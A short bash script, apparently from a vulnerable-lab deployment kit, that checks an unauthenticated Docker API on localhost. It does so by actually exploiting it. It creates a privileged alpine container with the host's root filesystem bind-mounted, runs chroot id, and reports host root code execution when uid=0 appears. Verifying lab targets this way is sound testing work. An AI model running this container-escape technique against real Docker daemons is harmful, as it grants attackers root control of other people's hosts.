#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/deploy-common.sh"

TARGET="Docker API"
URL="http://localhost:2375"

log_info "Verifying $TARGET at $URL..."

# Step 1: Check API is accessible
VERSION=$(curl -s --connect-timeout 5 --max-time 10 "${URL}/version" 2>/dev/null)
if ! echo "$VERSION" | grep -q "ApiVersion"; then
    log_error "$TARGET not reachable or not responding"
    exit 1
fi
log_success "$TARGET API is accessible"

# Step 2: Pull alpine image (if not present)
curl -s -X POST "${URL}/images/create?fromImage=alpine&tag=latest" > /dev/null 2>&1 || true

# Step 3: Create privileged container with host mount
CREATE=$(curl -s -X POST -H 'Content-Type: application/json' \
  "${URL}/containers/create?name=verify-$$" \
  -d '{
    "Image": "alpine",
    "Cmd": ["chroot", "/mnt", "id"],
    "Binds": ["/:/mnt:rbind"],
    "Privileged": true
  }' 2>/dev/null)

if ! echo "$CREATE" | grep -q "Id"; then
    log_error "$TARGET container creation failed"
    exit 1
fi

# Step 4: Start and capture output
curl -s -X POST "${URL}/containers/verify-$$/start" > /dev/null 2>&1

# Wait for command to complete
sleep 2

# Step 5: Get logs
LOGS=$(curl -s "${URL}/containers/verify-$$/logs?stdout=true&stderr=true" 2>/dev/null | tr -d '\0' | tail -5)

# Cleanup
curl -s -X DELETE "${URL}/containers/verify-$$?force=true" > /dev/null 2>&1

if echo "$LOGS" | grep -q "uid=0"; then
    log_success "$TARGET is vulnerable — host RCE confirmed"
    echo "  Response: $(echo "$LOGS" | grep -o 'uid=[^ ]*' | head -1)"
    exit 0
else
    log_error "$TARGET exploit failed — no host access"
    exit 1
fi
